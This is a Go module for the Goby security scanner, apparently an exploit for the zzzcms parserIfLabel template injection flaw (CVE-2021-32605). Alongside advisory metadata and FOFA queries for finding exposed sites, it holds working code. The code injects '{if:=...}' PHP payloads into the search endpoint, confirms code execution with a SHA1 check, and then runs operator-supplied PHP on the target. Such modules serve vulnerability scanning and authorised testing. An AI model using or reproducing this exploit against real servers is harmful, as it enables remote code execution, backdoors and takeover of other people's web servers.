package exploits

import (
	"crypto/sha1"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"net/url"
	"strconv"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "zzzcms parserIfLabel Template Injection RCE (CVE-2021-32605)",
    "Description": "<p>Zzzcms is a free open source website building system.</p><p>The front code execution of the latest version 1.5.9 of the zzzphp system may cause an attacker to arbitrarily execute code on the server side, thereby controlling the entire web server.</p>",
    "Product": "ZZZCMS",
    "Homepage": "http://www.zzzcms.com",
    "DisclosureDate": "2021-10-29",
    "Author": "featherstark@outlook.com",
    "FofaQuery": "(body=\"href=\\\"/?brandlist/zzzcms\" || body=\".banner .in_business ul li dd\" || title=\"zzzcms网站管理系统zzzcms.com\" || title=\"开源免费建站系统zzzcms.com\") || (body=\"href=\\\"/?brandlist/zzzcms\" || body=\".banner .in_business ul li dd\" || title=\"zzzcms网站管理系统zzzcms.com\" || title=\"开源免费建站系统zzzcms.com\")",
    "GobyQuery": "(body=\"href=\\\"/?brandlist/zzzcms\" || body=\".banner .in_business ul li dd\" || title=\"zzzcms网站管理系统zzzcms.com\" || title=\"开源免费建站系统zzzcms.com\") || (body=\"href=\\\"/?brandlist/zzzcms\" || body=\".banner .in_business ul li dd\" || title=\"zzzcms网站管理系统zzzcms.com\" || title=\"开源免费建站系统zzzcms.com\")",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"http://www.zzzcms.com/down/?list_5_1.html\">http://www.zzzcms.com/down/?list_5_1.html</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://fofa.so/"
    ],
    "Translation": {
        "CN": {
            "Name": "zzzcms parserIfLabel 模板注入命令执行漏洞（CVE-2021-32605）",
            "Product": "ZZZCMS",
            "Description": "<p>zzzcms是一个免费的开源建站系统。</p><p>zzzcms 存在 parserIfLabel 模板注入命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"http://www.zzzcms.com/down/?list_5_1.html\">http://www.zzzcms.com/down/?list_5_1.html</a></p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。<br>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>zzzcms 存在 parserIfLabel 模板注入命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "zzzcms parserIfLabel Template Injection RCE (CVE-2021-32605)",
            "Product": "ZZZCMS",
            "Description": "<p>Zzzcms is a free open source website building system.<br></p><p>The front code execution of the latest version 1.5.9 of the zzzphp system may cause an attacker to arbitrarily execute code on the server side, thereby controlling the entire web server.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"http://www.zzzcms.com/down/?list_5_1.html\">http://www.zzzcms.com/down/?list_5_1.html</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.<br>2. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p><span style=\"font-size: 16px;\">Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</span><br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "phpCode",
            "type": "input",
            "value": "die(PhPinfo())",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2021-32605"
    ],
    "CNNVD": [
        "CNNVD-202105-712"
    ],
    "CNVD": [],
    "CVSSScore": "9.3",
    "AttackSurfaces": {
        "Application": [
            "zzzcms"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10192"
}`

	execPHPCode := func(u *httpclient.FixUrl, phpCode string) (string, error) {
		cfg := httpclient.NewPostRequestConfig("/?location=search")
		cfg.VerifyTls = false
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg.Data = "keys=" + url.QueryEscape(fmt.Sprintf("{if:=%s}acc{end if}", phpCode))

		resp, err := httpclient.DoHttpRequest(u, cfg)
		if err == nil {
			return resp.RawBody, nil
		}
		return "", err
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			rand.Seed(time.Now().UnixNano())
			randStr := strconv.Itoa(600000 + rand.Intn(66667))
			md5Ret := fmt.Sprintf("%x", sha1.Sum([]byte(randStr)))

			body, err := execPHPCode(u, fmt.Sprintf("die(sha1(%s))", randStr))
			if err == nil && strings.Contains(body, md5Ret) {
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			phpCode := ss.Params["phpCode"].(string)
			body, err := execPHPCode(expResult.HostInfo, phpCode)
			if err == nil {
				expResult.Success = true
				expResult.Output = body
			}
			return expResult
		},
	))
}
